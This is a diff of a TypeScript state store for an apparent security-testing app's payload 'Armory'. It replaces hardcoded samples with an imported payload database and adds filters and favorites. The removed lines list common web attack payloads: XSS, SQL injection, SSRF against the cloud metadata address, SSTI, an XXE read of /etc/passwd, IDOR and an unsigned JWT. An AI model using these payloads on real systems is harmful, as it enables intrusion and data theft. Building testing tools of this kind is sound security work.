@@ -47,34 +47,56 @@ interface ForgeState {
 
 // ── Armory ────────────────────────────────────────────────────────────────────
 
+import { PAYLOAD_DATABASE, type Payload } from './payloadDatabase'
+
 export interface ArmoryPayload {
   id: string
   name: string
   category: string
+  subcategory?: string
   severity: 'low' | 'medium' | 'high' | 'critical'
   favorite: boolean
   content: string
+  description?: string
+  tags?: string[]
+  platform?: string[]
+  references?: string[]
 }
 
-const INITIAL_PAYLOADS: ArmoryPayload[] = [
-  { id: '1', name: 'IMG OnError Basic',        category: 'xss',  severity: 'medium',   favorite: true,  content: '<img src=x onerror=alert(document.domain)>' },
-  { id: '2', name: 'DOM Clobbering v2',        category: 'xss',  severity: 'high',     favorite: false, content: '<form id=x><output id=y>clobber</output></form>' },
-  { id: '3', name: 'UNION SELECT 5-col',       category: 'sqli', severity: 'critical', favorite: false, content: "' UNION SELECT null,null,null,null,null--" },
-  { id: '4', name: 'Blind SSRF OOB',           category: 'ssrf', severity: 'high',     favorite: true,  content: 'http://169.254.169.254/latest/meta-data/' },
-  { id: '5', name: "Jinja2 RCE {{7*7}}",       category: 'ssti', severity: 'critical', favorite: false, content: '{{7*7}}' },
-  { id: '6', name: 'XXE File Read /etc/passwd', category: 'xxe', severity: 'high',     favorite: false, content: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]><x>&f;</x>' },
-  { id: '7', name: 'IDOR UUID Predict',        category: 'idor', severity: 'medium',   favorite: false, content: 'GET /api/user/00000000-0000-0000-0000-000000000001' },
-  { id: '8', name: 'JWT None Algorithm',       category: 'auth', severity: 'critical', favorite: true,  content: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.' },
-]
+// Convert the built-in payload database to ArmoryPayload format
+const BUILTIN_PAYLOADS: ArmoryPayload[] = PAYLOAD_DATABASE.map((p: Payload) => ({
+  id: p.id,
+  name: p.name,
+  category: p.category,
+  subcategory: p.subcategory,
+  severity: p.riskLevel,
+  favorite: false,
+  content: p.payload,
+  description: p.description,
+  tags: p.tags,
+  platform: p.platform,
+  references: p.references,
+}))
+
+const INITIAL_PAYLOADS: ArmoryPayload[] = BUILTIN_PAYLOADS
 
 interface ArmoryState {
   payloads: ArmoryPayload[]
   searchQuery: string
   selectedId: string | null
+  categoryFilter: string | null
+  subcategoryFilter: string | null
+  platformFilter: string | null
+  riskFilter: string | null
   setSearchQuery: (q: string) => void
   setSelectedId: (id: string | null) => void
+  setCategoryFilter: (c: string | null) => void
+  setSubcategoryFilter: (s: string | null) => void
+  setPlatformFilter: (p: string | null) => void
+  setRiskFilter: (r: string | null) => void
   deletePayload: (id: string) => void
   addPayload: (payload: ArmoryPayload) => void
+  toggleFavorite: (id: string) => void
 }
 
 // ── Crucible ──────────────────────────────────────────────────────────────────
@@ -179,9 +201,17 @@ export const useForgeStore = create<ForgeState>((set) => ({
 export const useArmoryStore = create<ArmoryState>((set) => ({
   payloads: INITIAL_PAYLOADS,
   searchQuery: '',
-  selectedId: INITIAL_PAYLOADS[0].id,
+  selectedId: INITIAL_PAYLOADS[0]?.id ?? null,
+  categoryFilter: null,
+  subcategoryFilter: null,
+  platformFilter: null,
+  riskFilter: null,
   setSearchQuery: (q) => set({ searchQuery: q }),
   setSelectedId: (id) => set({ selectedId: id }),
+  setCategoryFilter: (c) => set({ categoryFilter: c, subcategoryFilter: null }),
+  setSubcategoryFilter: (s) => set({ subcategoryFilter: s }),
+  setPlatformFilter: (p) => set((state) => ({ platformFilter: state.platformFilter === p ? null : p })),
+  setRiskFilter: (r) => set((state) => ({ riskFilter: state.riskFilter === r ? null : r })),
   deletePayload: (id) =>
     set((state) => {
       const payloads = state.payloads.filter((p) => p.id !== id)
@@ -191,6 +221,10 @@ export const useArmoryStore = create<ArmoryState>((set) => ({
   addPayload: (payload) =>
     set((state) => ({
       payloads: [...state.payloads, { ...payload, id: generateId() }],
+    })),
+  toggleFavorite: (id) =>
+    set((state) => ({
+      payloads: state.payloads.map((p) => p.id === id ? { ...p, favorite: !p.favorite } : p),
     })),
 }))
 
